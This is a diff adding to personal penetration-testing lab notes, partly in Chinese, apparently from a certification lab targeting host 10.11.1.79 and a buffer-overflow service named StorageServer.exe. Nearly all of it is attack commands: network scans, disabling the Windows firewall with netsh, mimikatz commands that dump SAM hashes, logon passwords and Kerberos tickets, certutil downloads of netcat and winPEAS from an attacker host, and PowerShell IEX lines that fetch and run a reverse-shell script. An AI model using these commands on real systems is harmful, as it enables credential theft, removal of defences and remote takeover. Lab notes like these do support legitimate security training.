@@ -3,7 +3,27 @@ nmap -sV -sC -sS -Pn -p 8009 10.11.1.79 > nmapsss.txt
 nmap -p- 10.11.1.79 > nmapall.txt
 
 1.這台是BOF,發現機器名稱是maria，找到之前紀錄是chris有maria用戶
-2.在chris機器上有服務8009
+2.需要找到2233的檔案,這是BOF的檔案
+netstat -ano| findstr 2233
+ps | findstr 2456
+c:\>wmic process where processid=2176 get processid,executablepath,name
+3.將StorageServer.exe傳回到lab windows
+4.關閉windows lab的防火牆
+netsh advfirewall set currentprofile state off
+
+
+
+
+wmic process where processid=2176 get processid,executablepath,name
+ExecutablePath                                           Name               ProcessId
+C:\Program Files (x86)\StorageService\StorageServer.exe  StorageServer.exe  2176
+
+
+privilege::debug
+20.token::elevate
+21.lsadump::sam
+sekurlsa::logonpasswords
+sekurlsa::tickets
 
 
 kali:提供samba服務
@@ -16,5 +36,13 @@ cd timmy:
 echo 123 > 123.txt
 
 
+certutil.exe -urlcache -split -f http://192.168.119.134/nc64.exe nc64.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/winPEAS.exe winPEAS.exe
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/nc64.exe')
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-PowerShellTcp.ps1')
+
 cluster-howto.html
 for /r \ %i in (*howto*) do @echo %i
+
+
